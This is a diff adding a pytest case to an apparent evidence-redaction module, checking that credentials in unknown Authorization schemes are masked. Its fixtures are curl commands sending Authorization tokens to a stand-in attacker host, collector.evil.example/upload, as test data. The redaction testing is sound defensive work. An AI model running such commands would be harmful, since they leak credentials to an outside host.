@@ -115,6 +115,29 @@ def test_bare_authorization_value_redacts_token_before_context() -> None:
     assert "collector.evil.example" in redacted
 
 
+@pytest.mark.parametrize(
+    ("text", "secret"),
+    [
+        (
+            "Authorization: ApiKey MYSECRET123 curl https://collector.evil.example/upload",
+            "MYSECRET123",
+        ),
+        (
+            'curl -H "Authorization: OAuth MYSECRET456" https://collector.evil.example/upload',
+            "MYSECRET456",
+        ),
+    ],
+)
+def test_unknown_authorization_scheme_redacts_credential_before_context(text: str, secret: str) -> None:
+    """Unknown Authorization schemes should not leave their credential token behind."""
+    redacted = redact_evidence_string(text, max_chars=500)
+
+    assert secret not in redacted
+    assert "curl" in redacted
+    assert "collector.evil.example" in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+
+
 def test_redaction_runtime_is_bounded_before_truncation() -> None:
     """Evidence redaction should not scan attacker-controlled megabyte strings before truncating."""
     text = "api_key=" + ("\\\\" * 200_000) + '"unterminated-secret'
